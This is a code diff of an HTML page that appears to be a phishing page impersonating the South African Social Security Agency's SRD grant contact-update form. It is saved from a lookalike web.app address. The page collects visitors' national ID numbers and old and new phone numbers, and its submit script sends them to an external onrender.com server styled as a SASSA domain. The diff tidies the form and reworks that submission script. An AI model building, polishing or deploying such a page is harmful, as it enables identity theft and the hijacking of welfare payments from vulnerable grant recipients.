@@ -1,12 +1,10 @@
+
 <!DOCTYPE html>
 <!-- saved from url=(0046)https://srd-sassa-gov-za-sc19-contact.web.app/ -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>sassa</title>
   <link rel="icon" href="https://srd-sassa-gov-za-sc19-contact.web.app/sassa-logo2.jpeg" type="image/png">
-  <script src="./srd.change_files/firebase-app.js.download"></script>
-  <script src="./srd.change_files/firebase-firestore.js.download"></script>
   <style>
     body {
       margin: 0;
@@ -17,7 +15,6 @@
     .container {
       max-width: auto;
       margin: 0 auto;
-      
     }
 
     .header {
@@ -46,9 +43,9 @@
       margin-bottom: 5px;
       color: #333;
     }
-p{
-  text-align: start;
-}
+    p {
+      text-align: start;
+    }
     .application-form input {
       width: 98%;
       padding: 12px;
@@ -80,9 +77,6 @@ p{
       cursor: pointer;
     }
   </style>
-   
-  
-  
 </head>
 <body>
   <div class="container">
@@ -90,7 +84,7 @@ p{
       <img src="sassa-logo.png" alt="SASSA Logo">
     </header>
     <main>
-      <p class="application-form"> If you want to update your cellphone number and/or email address that is used for communication and web application access related to your COVID-19 SRD R370 grant, we firstly need to verify that you are the original applicant.Please submit your 13 digit South African identity number and cellphone number used on application or reapplication.
+      <p class="application-form">If you want to update your cellphone number and/or email address that is used for communication and web application access related to your COVID-19 SRD R370 grant, we firstly need to verify that you are the original applicant. Please submit your 13 digit South African identity number and cellphone number used on application or reapplication.
         Note that you can only submit one request to update your contact details in a 24 hour period.</p>
       <form class="application-form" id="applicationForm">
         <label for="idNumber">South African ID Number of Applicant *</label>
@@ -99,60 +93,51 @@ p{
         <label for="phoneNumber">Old Phone Number Used to Submit Your Application *</label>
         <input type="text" id="phoneNumber" maxlength="10" placeholder="Enter your phone number" oninput="validateForm()">
         
-        <label for="phoneNumber">New Phone Number *</label>
+        <label for="newphoneNumber">New Phone Number *</label>
         <input type="text" id="newphoneNumber" maxlength="10" placeholder="Enter your phone number" oninput="validateForm()">
-        <button type="submit" class="submit-btn" id="submitButton" disabled="">Submit</button>
+        <button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>
       </form>
     </main>
   </div>
 
   <script>
-    
     function validateForm() {
       const idNumber = document.getElementById('idNumber').value;
       const phoneNumber = document.getElementById('phoneNumber').value;
       const submitButton = document.getElementById('submitButton');
-  
-      // Enable the button only if ID is 13 digits and phone number is 10 digits
-      if (idNumber.length === 13 && phoneNumber.length === 10) {
-        submitButton.disabled = false;
-      } else {
-        submitButton.disabled = true;
-      }
+      submitButton.disabled = !(idNumber.length === 13 && phoneNumber.length === 10);
     }
-  
-
   </script>
-  
 
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+        e.preventDefault();
 
+        const idNumber = document.getElementById("idNumber").value.trim();
+        const phoneNumber = document.getElementById("phoneNumber").value.trim();
+        const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
 
-<script>
-document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-  e.preventDefault();
+        try {
+          const response = await fetch("https://srd-sassa-gov-za-change-contact-3ebc.onrender.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+          });
 
-  const idNumber = document.getElementById("idNumber").value.trim();
-  const phoneNumber = document.getElementById("phoneNumber").value.trim();
-  const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
-
-  try {
-    const response = await fetch("https://srd-sassa-gov-za-change-contact-3ebc.onrender.com/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+          if (response.ok) {
+            alert("Application submitted successfully!");
+          } else if (response.status === 409) {
+            alert("Duplicate entry found.");
+          } else {
+            alert("An error occurred.");
+          }
+        } catch (error) {
+          console.error("Submission error:", error);
+          alert("Could not connect to server.");
+        }
+      });
     });
-
-    if (response.ok) {
-      alert("Application submitted successfully!");
-    } else if (response.status === 409) {
-      alert("Duplicate entry found.");
-    } else {
-      alert("An error occurred.");
-    }
-  } catch (error) {
-    console.error("Submission error:", error);
-  }
-});
-</script>
-
-</body></html>
+  </script>
+</body>
+</html>
